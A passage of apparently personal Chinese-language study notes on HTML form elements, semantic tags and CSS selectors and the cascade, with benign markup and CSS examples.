最小长度</li><li>pattern：规定了一个表单控件的值应该匹配的正则表达式。</li></ul></li><li><p>select：下拉列表框</p><ul><li>option：选项</li></ul></li><li><p>textarea:长文本</p><ul><li>rows：行（高度）</li><li>cols：字符数（宽度）</li></ul></li><li><p>label:表示用户界面中某个元素的说明。</p><ul><li><p>将一个 <code>&lt;label&gt;</code> 和一个 <code>&lt;input&gt;</code> 元素匹配在一起，你需要给 <code>&lt;input&gt;</code> 一个 <code>id</code> 属性。而 <code>&lt;label&gt;</code> 需要一个 <code>for</code> 属性，其值和 <code>&lt;input&gt;</code> 的 <code>id</code> 一样。</p></li><li><p>也可以将 <code>&lt;input&gt;</code> 直接放在 <code>&lt;label&gt;</code> 里，此时则不需要 <code>for</code> 和 <code>id</code> 属性，因为关联已隐含存在.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">label</span></span><br><span class="hljs-tag">  &gt;</span>Do you like peas?<br>  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;peas&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br></code></pre></td></tr></table></figure></li></ul></li><li><p>fieldset:用于对表单中的控制元素进行分组（包括label）</p><ul><li><code>&lt;legend&gt; </code>元素用于表示其父元素<code>fieldset</code>的内容标题。</li></ul></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span><br>    用户名称：<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;默认值&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br>    密码：<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;password&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br>    确认密码：<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;password&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br>    性别：<br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;sex&quot;</span> <span class="hljs-attr">checked</span>=<span class="hljs-string">&quot;checked&quot;</span>&gt;</span>男<br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;sex&quot;</span>&gt;</span>女<span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br>    兴趣爱好：<br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span> <span class="hljs-attr">checked</span>=<span class="hljs-string">&quot;checked&quot;</span>&gt;</span>java<br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span>&gt;</span>c++<br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span>&gt;</span>php<br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span>&gt;</span>python<span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br>    国籍：<br>    <span class="hljs-tag">&lt;<span class="hljs-name">select</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">option</span>&gt;</span>--请选择国籍--<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">option</span>&gt;</span>中国<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">option</span>&gt;</span>日本<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">option</span>&gt;</span>韩国<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">option</span>&gt;</span>美国<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br>    自我评价：<br>    <span class="hljs-tag">&lt;<span class="hljs-name">textarea</span> <span class="hljs-attr">rows</span>=<span class="hljs-string">&quot;10&quot;</span> <span class="hljs-attr">cols</span>=<span class="hljs-string">&quot;20&quot;</span>&gt;</span>默认值<span class="hljs-tag">&lt;/<span class="hljs-name">textarea</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;reset&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;点击重置&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;点击提交&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;普通的按钮&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></td></tr></table></figure><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230228123542891.png" alt="image-20230228123542891" style="zoom:50%;" /><ul><li>如果想表单对齐，可以放在表格里。</li></ul></li><li><p>div：默认独占一行</p></li><li><p>span：长度是封装数据的长度</p></li><li><p>p：默认在段落的上方或下方各空出一行（如果已空则不需要）</p></li></ul><h2 id="3-其他"><a href="#3-其他" class="headerlink" title="3.其他"></a>3.其他</h2><p><strong>描述列表</strong>（description list）：这种列表的目的是标记一组项目及其相关描述，例如术语和定义，或者是问题和答案等。</p><p>描述列表使用与其他列表类型不同的闭合标签——<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/dl"><code>&lt;dl&gt;</code></a>；每一项都用 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/dt"><code>&lt;dt&gt;</code></a>（description term）元素。每个描述都用 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/dd"><code>&lt;dd&gt;</code></a>（description definition）元素。</p><p><strong>引用</strong></p><ul><li><p>块引用：用<code> &lt;blockquote&gt;</code> 元素包裹起来表示，并且在 <strong>cite</strong> 属性里用 URL 来指向引用的资源</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">blockquote</span></span><br><span class="hljs-tag">  <span class="hljs-attr">cite</span>=<span class="hljs-string">&quot;https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/blockquote&quot;</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><br>    The <span class="hljs-tag">&lt;<span class="hljs-name">strong</span>&gt;</span>HTML <span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span><span class="hljs-symbol">&amp;lt;</span>blockquote<span class="hljs-symbol">&amp;gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span> Element<span class="hljs-tag">&lt;/<span class="hljs-name">strong</span>&gt;</span> (or<br>    <span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>HTML Block Quotation Element<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span>) indicates that the enclosed text is<br>    an extended quotation.<br>  <span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">blockquote</span>&gt;</span><br></code></pre></td></tr></table></figure></li><li><p>行引用：使用<code>&lt;q&gt;</code>元素，cite属性。</p></li><li><p>引文：<code>&lt;cite&gt;</code>元素。引文默认的字体样式为斜体。</p></li></ul><p>缩略语：<code>&lt;abbr&gt;</code>,它常被用来包裹一个缩略语或缩写，并且提供缩写的解释。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><br>  我们使用<br>  <span class="hljs-tag">&lt;<span class="hljs-name">abbr</span> <span class="hljs-attr">title</span>=<span class="hljs-string">&quot;超文本标记语言（Hyper text Markup Language）&quot;</span>&gt;</span>HTML<span class="hljs-tag">&lt;/<span class="hljs-name">abbr</span>&gt;</span><br>  来组织网页文档。<br><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><br>  第 33 届<span class="hljs-tag">&lt;<span class="hljs-name">abbr</span> <span class="hljs-attr">title</span>=<span class="hljs-string">&quot;夏季奥林匹克运动会&quot;</span>&gt;</span>奥运会<span class="hljs-tag">&lt;/<span class="hljs-name">abbr</span>&gt;</span>将于 2024 年 8<br>  月在法国巴黎举行。<br><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></td></tr></table></figure><p>标记联系方式：<code>&lt;address&gt;</code></p><p><strong>上标</strong>（例如：º¹²）：<code>&lt;sub</code></p><p><strong>下标</strong>（例如：₁₂₉）：：<code>&lt;sup&gt;</code></p><p><strong>展示计算机代码</strong>：</p><ul><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/code"><code>code</code></a>：用于标记计算机通用代码。</li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/pre"><code>pre</code></a>：用于保留空白字符（通常用于代码块）——如果文本中使用了缩进或多余的空白，浏览器将忽略它，你将不会在呈现的页面上看到它。但是，如果你将文本包含在 <code>&lt;pre&gt;&lt;/pre&gt;</code> 标签中，那么空白将会以与你在文本编辑器中看到的相同的方式渲染出来。</li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/var"><code>var</code></a>：用于标记具体变量名。</li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/kbd"><code>kbd</code></a>：用于标记输入电脑的键盘（或其他类型）输入。</li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/samp"><code>samp</code></a>：用于标记计算机程序的输出。</li></ul><p><strong>标记时间和日期</strong>：<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/time"><code>&lt;time&gt;</code></a></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- 标准简单日期 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">time</span> <span class="hljs-attr">datetime</span>=<span class="hljs-string">&quot;2016-01-20&quot;</span>&gt;</span>20 January 2016<span class="hljs-tag">&lt;/<span class="hljs-name">time</span>&gt;</span><br><span class="hljs-comment">&lt;!-- 只包含年份和月份--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">time</span> <span class="hljs-attr">datetime</span>=<span class="hljs-string">&quot;2016-01&quot;</span>&gt;</span>January 2016<span class="hljs-tag">&lt;/<span class="hljs-name">time</span>&gt;</span><br><span class="hljs-comment">&lt;!-- 只包含月份和日期 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">time</span> <span class="hljs-attr">datetime</span>=<span class="hljs-string">&quot;01-20&quot;</span>&gt;</span>20 January<span class="hljs-tag">&lt;/<span class="hljs-name">time</span>&gt;</span><br><span class="hljs-comment">&lt;!-- 只包含时间，小时和分钟数 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">time</span> <span class="hljs-attr">datetime</span>=<span class="hljs-string">&quot;19:30&quot;</span>&gt;</span>19:30<span class="hljs-tag">&lt;/<span class="hljs-name">time</span>&gt;</span><br><span class="hljs-comment">&lt;!-- 还可包含秒和毫秒 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">time</span> <span class="hljs-attr">datetime</span>=<span class="hljs-string">&quot;19:30:01.856&quot;</span>&gt;</span>19:30:01.856<span class="hljs-tag">&lt;/<span class="hljs-name">time</span>&gt;</span><br><span class="hljs-comment">&lt;!-- 日期和时间 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">time</span> <span class="hljs-attr">datetime</span>=<span class="hljs-string">&quot;2016-01-20T19:30&quot;</span>&gt;</span>7.30pm, 20 January 2016<span class="hljs-tag">&lt;/<span class="hljs-name">time</span>&gt;</span><br><span class="hljs-comment">&lt;!-- 含有时区偏移值的日期时间 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">time</span> <span class="hljs-attr">datetime</span>=<span class="hljs-string">&quot;2016-01-20T19:30+01:00&quot;</span></span><br><span class="hljs-tag">  &gt;</span>7.30pm, 20 January 2016 is 8.30pm in France&lt;/time<br>&gt;<br><span class="hljs-comment">&lt;!-- 提及特定周 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">time</span> <span class="hljs-attr">datetime</span>=<span class="hljs-string">&quot;2016-W04&quot;</span>&gt;</span>The fourth week of 2016<span class="hljs-tag">&lt;/<span class="hljs-name">time</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>语义化标签</strong></p><ul><li><p><strong><code>&lt;header&gt;</code> <strong>：用于展示</strong>介绍性内容</strong>，通常包含一组介绍性的或是辅助导航的实用元素。</p><p>可能包含Logo、搜索框、作者名称，等等。</p></li><li><p>**<code>&lt;main&gt;</code> :**呈现了文档的<code>&lt;body&gt;</code>或应用的主体部分。</p></li><li><p><strong><code>&lt;footer&gt; </code>:</strong> 表示最近一个章节内容或者根节点（sectioning root）元素的<strong>页脚</strong>。</p><p>通常包含该章节作者、版权数据或者与文档相关的链接等信息。</p></li><li><p><strong><code>&lt;nav&gt;</code><strong>：在当前文档或其他文档中提供</strong>导航链接</strong>。</p><p>导航部分的常见示例是菜单，目录和索引。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs css">&lt;<span class="hljs-selector-tag">nav</span> class=&quot;crumbs&quot;&gt;<br>  &lt;<span class="hljs-selector-tag">ol</span>&gt;<br>    &lt;<span class="hljs-selector-tag">li</span> class=&quot;crumb&quot;&gt;&lt;<span class="hljs-selector-tag">a</span> href=&quot;#&quot;&gt;Bikes&lt;/<span class="hljs-selector-tag">a</span>&gt;&lt;/<span class="hljs-selector-tag">li</span>&gt;<br>    &lt;<span class="hljs-selector-tag">li</span> class=&quot;crumb&quot;&gt;&lt;<span class="hljs-selector-tag">a</span> href=&quot;#&quot;&gt;BMX&lt;/<span class="hljs-selector-tag">a</span>&gt;&lt;/<span class="hljs-selector-tag">li</span>&gt;<br>    &lt;<span class="hljs-selector-tag">li</span> class=&quot;crumb&quot;&gt;Jump Bike <span class="hljs-number">3000</span>&lt;/<span class="hljs-selector-tag">li</span>&gt;<br>  &lt;/<span class="hljs-selector-tag">ol</span>&gt;<br>&lt;/<span class="hljs-selector-tag">nav</span>&gt;<br></code></pre></td></tr></table></figure></li><li><p><strong><code>&lt;section&gt; </code>：</strong>表示 HTML 文档中一个通用独立章节，它没有更具体的语义元素来表示。</p></li></ul><h1 id="CSS"><a href="#CSS" class="headerlink" title="CSS"></a>CSS</h1><p>CSS是「层叠样式表单」。是用于（增强）控制网页样式并允许将样式信息与网页内容分离的一种标记性语言。</p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20230228185109842.png" alt="image-20230228185109842" style="zoom:50%;" /><p><strong>选择器</strong>：浏览器根据“选择器”决定受CSS样式影响的HTML元素（标签）。</p><p><strong>属性（property）</strong>人类可读的标识符。是你要改变的样式名。</p><p><strong>值</strong>：每个指定的属性都有一个值，指示想要更改的样式特征。</p><p>属性和值被冒号分开，并由花括号包围，这样就组成了一个完整的<strong>样式声明（declaration）</strong>，</p><p>例如：p｛color:blue｝</p><p><strong>多个声明</strong>：如果要定义不止一个声明，则需要用分号将每个声明分开。虽然最后一条声明的最后可以不加分号（但尽量在每条声明的末尾都加上分号）</p><p>一般每行只会描述一个属性。</p><p><strong>简写属性</strong>：一些属性，如 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/font"><code>font</code></a>、<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/background"><code>background</code></a>、<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/padding"><code>padding</code></a>、<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/border"><code>border</code></a> 和 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/margin"><code>margin</code></a> 等属性称为简写属性。它们允许在一行中设置多个属性值，从而节省时间并使代码更整洁。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-attribute">padding</span>: <span class="hljs-number">10px</span> <span class="hljs-number">15px</span> <span class="hljs-number">15px</span> <span class="hljs-number">5px</span>;<br></code></pre></td></tr></table></figure><p>注释：<code>/* */</code></p><p>css的组成：选择器、属性和值、@规则、注释、空白。</p><p>css如何工作：</p><ol><li><p>浏览器载入html文件</p></li><li><p>将html文件转化为一个DOM（Document Object Model）</p></li><li><p>浏览器拉取该 HTML 相关的大部分资源（比如嵌入到页面的图片、视频和 CSS 样式）。JavaScript 则会稍后进行处理。</p></li><li><p>浏览器拉取到 CSS 之后会进行解析，根据选择器的不同类型（比如 element、class、id  等等）把他们分到不同的“桶”中。浏览器基于它找到的不同的选择器，将不同的规则（基于选择器的规则，如元素选择器、类选择器、id  选择器等）应用在对应的 DOM 的节点中，并添加节点依赖的样式（这个中间步骤称为渲染树）。</p></li><li><p>上述的规则应用于渲染树之后，渲染树会依照应该出现的结构进行布局。</p></li><li><p>网页展示在屏幕上（这一步被称为着色）。</p></li></ol><h2 id="引入方式"><a href="#引入方式" class="headerlink" title="引入方式"></a>引入方式</h2><ol><li><p>直接在标签上写（<strong>内联样式</strong>）</p><p>缺点：</p><p>1.如果标签多了。样式多了。代码量非常庞大。</p><p>2.可读性非常差。</p><p>3.复用性差。</p></li><li><p>用style（<strong>内部样式表</strong>）</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span>&gt;</span><span class="language-css"></span><br><span class="language-css">        <span class="hljs-selector-tag">div</span>&#123;</span><br><span class="language-css">            <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> red solid;</span><br><span class="language-css">        &#125;</span><br><span class="language-css">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br></code></pre></td></tr></table></figure><p>缺点：</p><p>1.只能在同一页面内复用代码，不能在多个页面中复用css代码。</p><p>2.维护起来不方便，实际的项目中会有成千上万的页面，要到每个页面中去修改。工作量太大了。</p></li><li><p>写成单独的css文件引入（<strong>外部样式表</strong>）</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;1.css&quot;</span>/&gt;</span><br></code></pre></td></tr></table></figure></li></ol><h2 id="选择器"><a href="#选择器" class="headerlink" title="选择器"></a>选择器</h2><ol><li><p><strong>标签名选择器（类型选择器、元素选择器）</strong></p></li><li><p><strong>ID选择器  #</strong></p></li><li><p><strong>class选择器（类选择器） .</strong></p></li><li><p><strong>标签属性选择器</strong> 例：a[title]</p><p><u><strong>存否定和值</strong></u>选择器:</p><ul><li><p><code>[attr=value]</code>:匹配一个名为atter的属性，其值为value</p><p>例如<code>a[href=&quot;https://example.com&quot;]</code></p></li><li><p><code>[attr~=value]</code>:匹配一个名为atter的元素，其值中有一个和value匹配。</p></li><li><p><code>[attr|=value]</code>:匹配一个带有一个名为<em>attr</em>的属性的元素，其值可正为<em>value</em>，或者开始为<em>value</em>，后面紧随着一个连字符。</p></li></ul><p>**<u>字符串匹配</u>**选择器：</p><ul><li><code>[attr^=value]</code>:匹配atter属性，值开头为<em>value</em>子字符串。</li><li><code>[attr$=value]</code>:匹配atter属性，值结尾为<em>value</em>子字符串</li><li><code>[attr*=value]</code>:匹配atter属性，其值字符串中出现过至少一次<em>value</em>子字符串</li></ul><p>若想要大小写不敏感，闭合括号前使用<code>i</code>值。</p></li><li><p><strong>伪类和伪元素</strong> 例：<code>:hover</code>、<code>::first-line</code></p><p>一些伪类：</p><ul><li><p><code>:first-child</code>和<code>:last-child</code>：第一个&#x2F;最后一个元素</p></li><li><p><code>:first-of-type</code> 表示一组兄弟元素中其类型的第一个元素。</p></li><li><p><code>:invalid</code> 用来选择任何未通过验证的<code>&lt;from&gt;、&lt;fieldset&gt;、&lt;input&gt;</code>或其他表单元素</p></li><li><p><strong><code>:not()</code></strong> CSS <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/Pseudo-classes">伪类</a>用来匹配不符合一组选择器的元素。由于它的作用是防止特定的元素被选中，它也被称为<em>反选伪类</em>（<em>negation pseudo-class</em>）。</p></li><li><p><code>:hover</code>：用户将指针挪到元素上时激活</p></li><li><p><code>:focus</code>：用户点击、轻触或使用键盘的 Tab 键焦点某个元素时激活（如表单输入）</p></li><li><p><strong><code>:nth-of-type()</code></strong> CSS 伪类基于相同类型（标签名称）的兄弟元素中的位置来匹配元素。</p></li><li><p><code>:nth-child(an+b)</code>：首先找到所有当前元素的兄弟元素，然后按照位置先后顺序从 1 开始排序，选择的结果为 CSS 伪类:nth-child 括号中表达式（an+b）匹配到的元素集合（n&#x3D;0，1，2，3…）。</p><ul><li><code>0n+3</code> 或简单的 <code>3</code> 匹配第三个元素。</li><li><code>1n+0</code> 或简单的 <code>n</code> 匹配每个元素。（兼容性提醒：在 Android 浏览器 4.3 以下的版本 <code>n</code> 和 <code>1n</code> 的匹配方式不一致。<code>1n</code> 和 <code>1n+0</code> 是一致的，可根据喜好任选其一来使用。）</li><li><code>2n+0</code> 或简单的 <code>2n</code> 匹配位置为 2、4、6、8…的元素（n&#x3D;0 时，2n+0&#x3D;0，第 0 个元素不存在，因为是从 1 开始排序)。你可以使用关键字 <strong><code>even</code></strong> 来替换此表达式。</li></ul></li></ul><p>一些伪元素：</p><ul><li><p><code>::first-line</code>:首行</p></li><li><p><code>::before</code>：其将成为匹配选中的元素的第一个子元素。常通过 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/content"><code>content</code></a> 属性来为一个元素添加修饰性的内容。默认为行内元素。</p></li><li><p><code>::after</code>：作为已选中元素的最后一个子元素。通常会配合<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/content"><code>content</code></a>属性来为该元素添加装饰内容。默认是行内元素。</p><p>例如：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.container</span><span class="hljs-selector-pseudo">::after</span> &#123;<br>  <span class="hljs-attribute">content</span>: <span class="hljs-string">&quot;&quot;</span>;<br>  <span class="hljs-attribute">width</span>: <span class="hljs-number">860px</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul></li><li><p><strong>关系选择器</strong></p><ol><li><p><strong>后代选择器</strong> <code> </code>（空格）</p></li><li><p><strong>子代关系选择器</strong>（子元素选择器） <code>&gt;</code></p></li><li><p><strong>相邻兄弟选择器</strong> <code>+</code></p></li><li><p><strong>通用兄弟选择器</strong> <code>~</code></p><p>不相邻的兄弟元素。例如选中<code>&lt;p&gt;</code>元素后任何地方的<code>&lt;img&gt;</code></p></li></ol></li><li><p><strong>运算符</strong> </p></li><li><p><strong>全局选择器</strong> <code>*</code></p><ul><li><p>可让选择器更易读</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">article</span> <span class="hljs-selector-pseudo">:first</span>-child &#123;<br>&#125;<br><span class="hljs-comment">/* 容易和article:first-child混淆，使用* */</span><br><span class="hljs-selector-tag">article</span> *<span class="hljs-selector-pseudo">:first</span>-child &#123;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul></li></ol><p>如果不同的选择器有相同的css，可以用<u>逗号<code>,</code>组合</u>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c's's">h1, .special &#123;<br>  color: blue;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="层叠与继承"><a href="#层叠与继承" class="headerlink" title="层叠与继承"></a>层叠与继承</h2><h3 id="层叠"><a href="#层叠" class="headerlink" title="层叠"></a>层叠</h3><p>当发生层叠时，层叠时需要考虑三个因素。</p><p>根据重要性排序如下（由轻到重）：</p><p>1. </p><ol><li><strong>资源顺序</strong></li><li><strong>优先级</strong></li><li><strong>重要程度</strong></li></ol><p>资源顺序：同样权重时，<strong>后面的规则会应用</strong>（后覆盖前）</p><p>一个选择器的<strong>优先级</strong>可以说是由三个不同的值（或分量）相加，可以认为是百（ID）十（类）个（元素）——三位数的三个位数：</p><ul><li><strong>ID</strong>：选择器中包含 ID 选择器则百位得一分。</li><li><strong>类</strong>：选择器中包含类选择器、属性选择器或者伪类则十位得一分。</li><li><strong>元素</strong>：选择器中包含元素、伪元素选择器则个位得一分。</li></ul><p>通用选择器（<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/Universal_selectors"><code>*</code></a>）、组合符（<code>+</code>、<code>&gt;</code>、<code>~</code>、’ 